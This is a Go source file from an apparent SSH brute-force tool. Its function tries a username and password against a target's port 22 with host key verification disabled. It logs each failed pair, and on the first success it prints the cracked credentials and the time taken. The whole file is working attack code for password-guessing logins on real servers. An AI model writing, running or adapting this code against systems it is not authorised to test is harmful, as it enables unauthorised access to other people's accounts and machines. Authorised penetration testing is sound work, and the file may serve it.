package brute

import (
	"fmt"
	"golang.org/x/crypto/ssh"
	"log"
	"time"
	"sync/atomic"
)

const (
    Red    = "\033[31m"   // Color code for red
    Green  = "\033[32m"   // Color code for green
    Reset  = "\033[0m"    // Reset color code
)

func SSHLogin(user string, passwd string, target string, found *int32, start time.Time) {
	// SSH authentication configuration
	config := &ssh.ClientConfig{
		User: user, // SSH username
		Auth: []ssh.AuthMethod{
			ssh.Password(passwd), // SSH password authentication
		},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(), // Ignores host key verification (not recommended for production)
		Timeout: 5 * time.Second, // Sets timeout for SSH connection
	}

	// Establish SSH connection
	client, err := ssh.Dial("tcp", target+":22", config) // Replace with the server IP and port
	if err != nil {
		if atomic.LoadInt32(found) == 0 {
			log.Printf("Failed to connect with user: %s and password: %s", user, passwd)
		}
		return
	}
	defer client.Close()

	// If the connection is successful, log the credentials
	if atomic.CompareAndSwapInt32(found, 0, 1) {
		crackTime := time.Since(start)
		crackSec := crackTime.Seconds()
		fmt.Println("<=============================>")
		fmt.Println(Green+"Brute force successful!"+Reset)
		fmt.Println("<=============================>")
		fmt.Println("User:", user)
		fmt.Println("Password:", passwd)
		fmt.Println("<=============================>")
		fmt.Printf("%sSSH client cracked in %.2f seconds%s\n", Green, crackSec, Reset)
		fmt.Println("<=============================>")
	}
}
